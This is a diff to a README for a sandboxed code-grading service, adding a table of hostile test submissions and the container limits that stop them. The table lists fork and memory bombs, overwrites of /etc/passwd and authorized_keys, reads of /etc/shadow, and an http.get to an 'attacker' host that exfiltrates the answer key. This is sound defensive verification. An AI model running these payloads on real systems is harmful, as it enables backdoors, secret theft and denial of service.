@@ -100,6 +100,25 @@ timeout (SIGKILL to the child's process group), a hard per-case fallback, and an
 backstop — so an infinite loop, a pipe-holding detached grandchild, or a wedged harness can never stall a grading
 worker. **`scripts/abuse-demo.sh` is the runnable evidence for all of this.**
 
+**Containment matrix — every row live-verified end-to-end** (submitted as a real solution; each payload prints its
+own outcome to stdout). In all cases the submission ended **FAILED** (never a forged PASS), `/health` stayed **200**
+throughout, and no `verdict-sub-*` container was left behind:
+
+| Hostile submission | Guardrail that stops it | Observed result |
+|---|---|---|
+| `while (true) {}` — infinite loop | per-case **5 s** wall-clock → `SIGKILL` of the child's process group | every case **TIMEOUT** (~5.0 s) → **FAILED** |
+| `for(;;) child_process.spawn(node…)` — fork bomb | `--pids-limit 64` + process-group kill + `--init`/tini reaping | **host process count never moves**, no leaked container → **FAILED** |
+| Delete/overwrite the grader & write a backdoor (`fs.unlinkSync('/work/harness.js')`, `writeFileSync('/etc/passwd'…)`, `/root/.ssh/authorized_keys`) | `--read-only` + `-v …/work:ro` | every write **blocked — `EROFS` / `EACCES`**; grader files untouched |
+| Exfiltrate the answer key (`http.get('http://attacker…', manifest)`) | `--network none` **and** the answer key is withheld from the container | request can't connect (killed at timeout); the manifest exposes only `{id, input}` — `hasExpectedOutput=false`, so there is **nothing to steal** |
+| De-root / read host secrets (`fs.readFileSync('/etc/shadow')`) | `--user 65534` + `--cap-drop ALL` + `--security-opt no-new-privileges` | runs as **`uid=65534` (nobody)**; `/etc/shadow` → **`EACCES`** |
+| Fill the disk (`write 128 MB to /tmp`) | `--tmpfs /tmp:…,size=16m` | write **stops at `ENOSPC`** (~16 MB) |
+| Memory bomb (`Buffer.alloc(10MB)` forever) | `--memory 256m --memory-swap 256m` (zero swap) + per-case timeout | process killed, **host RSS unaffected** → **FAILED** |
+
+None can crash the environment or forge a PASS: submitted code runs **only** inside the throwaway container (never
+in the API process or the browser — the UI just polls for the verdict), expected outputs are withheld from it, and
+pass/fail is computed host-side. `bash scripts/verify-destructive.sh` reproduces this matrix (exits non-zero if any
+payload escapes); the two DoS rows are also in `scripts/abuse-demo.sh`.
+
 ### 2. Prompt-injection & LLM safety
 
 All untrusted text — submitted **code**, its **stdout/stderr** (a hostile program can *print* an injection payload),
@@ -179,7 +198,8 @@ JSON) · `Doubt` → `Answer` (`authorType AI|TEACHER`, `state DRAFT|PENDING_REV
 
 ```bash
 pnpm test                      # ~180 unit tests: state machine, redaction, Zod gates, caps, verdict/scoring — DB/Docker/network-free (this is what CI runs)
-bash scripts/abuse-demo.sh     # the sandbox evidence artifact (needs the stack up): 7 containment assertions
+bash scripts/abuse-demo.sh          # sandbox evidence artifact (needs the stack up): 7 containment assertions
+bash scripts/verify-destructive.sh  # destructive-payload matrix: fs destruction, key exfil, de-root, disk/mem bombs
 # e2e happy-path (needs DB, MOCK mode):
 docker compose up -d --wait db && pnpm --filter @verdict/api prisma:deploy && pnpm --filter @verdict/api seed
 MOCK_LLM=1 pnpm --filter @verdict/api test:e2e
@@ -200,6 +220,5 @@ All config is env-driven; see **`.env.example`** for the full list with safe loc
 
 ## What v1 intentionally does not do
 
-JS-only sandbox (Python re-enters trivially — same runner), textarea editor (not CodeMirror), no registration/
-multi-tenancy/notifications/websockets, no ReviewAudit UI (the writes exist). These were scoped out to spend the time
-budget on the five graded axes above.
+JS-only sandbox (Python re-enters trivially — same runner), no registration/multi-tenancy/notifications/websockets,
+no ReviewAudit UI (the writes exist). These were scoped out to spend the time budget on the five graded axes above.
